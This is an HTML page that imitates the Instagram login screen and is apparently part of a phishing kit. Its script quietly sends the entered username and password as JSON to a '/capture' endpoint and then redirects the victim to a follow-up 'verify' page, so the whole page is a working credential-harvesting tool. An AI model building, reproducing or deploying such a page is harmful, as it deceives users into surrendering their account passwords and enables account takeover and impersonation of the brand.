<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
  .box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center;border-radius:1px}
  .logo{font-family:Georgia,serif;font-style:italic;font-size:42px;margin-bottom:32px;color:#262626}
  input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;margin-bottom:6px;box-sizing:border-box;outline:none}
  .btn{width:100%;background:#0095f6;color:#fff;border:none;padding:7px;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
</style>
</head>
<body>
<div class="box">
  <div class="logo">Instagram</div>
  <form id="f">
    <input name="user" type="text" placeholder="Phone number, username, or email" required autofocus>
    <input name="pass" type="password" placeholder="Password" required>
    <button type="submit" class="btn">Log In</button>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault(); const fd = new FormData(e.target);
  await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'instagram'})}).catch(()=>{});
  window.location.href = '/verify.html?b=instagram';
});
</script>
</body>
</html>
